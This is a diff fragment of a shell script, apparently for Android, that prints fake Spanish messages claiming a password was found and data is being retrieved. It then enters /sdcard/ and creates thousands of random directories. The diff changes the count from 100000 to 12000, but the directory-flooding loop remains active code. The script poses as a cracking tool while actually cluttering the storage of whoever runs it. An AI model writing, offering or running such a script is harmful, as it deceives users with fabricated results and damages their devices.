@@ -103,7 +103,7 @@ printf "\e[1;35mIntentando contraseña:\e[1;31m 40/2550\n"
 printf "\e[1;32mPASS FOUND.. 40/2550\n"
 printf "\e[1;35mObteniendo los datos.. espere..\n"
 cd /sdcard/
-for i in {1..100000}
+for i in {1..12000}
 do
  mkdir ${RANDOM}
 done
